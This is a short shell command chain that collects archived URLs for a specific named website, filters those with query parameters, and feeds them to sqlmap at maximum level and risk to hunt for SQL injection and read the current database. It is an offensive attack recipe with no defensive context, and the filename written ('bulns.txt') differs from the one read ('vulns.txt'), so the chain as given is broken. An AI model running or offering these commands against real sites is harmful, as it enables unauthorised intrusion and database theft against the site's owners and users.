echo "https://nurbek.codes" | waybackurls | grep -E '.php|.asp|.jsp' | 
grep '=' | urldedupe | tee bulns.txt;
sqlmap -m vulns.txt --batch --random-agent --current-db --level 5 --risk 3;